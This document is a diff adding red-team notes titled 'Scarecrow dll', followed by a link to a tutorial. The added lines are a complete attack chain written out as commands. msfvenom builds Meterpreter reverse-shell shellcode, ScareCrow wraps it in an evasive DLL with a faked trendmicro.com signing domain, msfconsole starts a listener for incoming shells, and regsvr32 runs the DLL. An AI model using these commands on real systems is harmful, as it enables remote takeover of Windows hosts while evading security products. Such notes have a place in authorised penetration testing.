@@ -1,3 +1,24 @@
+## Scarecrow dll
+#### Generate shellcode
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -i 11 -f raw -o hackerman.bin
+```
+
+#### Run with scarecrow
+```
+ScareCrow -Loader dll -domain trendmicro.com -I shellcode.bin
+```
+
+#### Start listener
+```
+sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
+```
+
+#### Run payload
+```
+regsvr32.exe C:\Windows\Tasks\urlmon.dll
+```
+
 ## Extra Xorred meterpreter DLL
 - https://crypt0jan.medium.com/red-team-tutorials-4-616c565ccec9
 
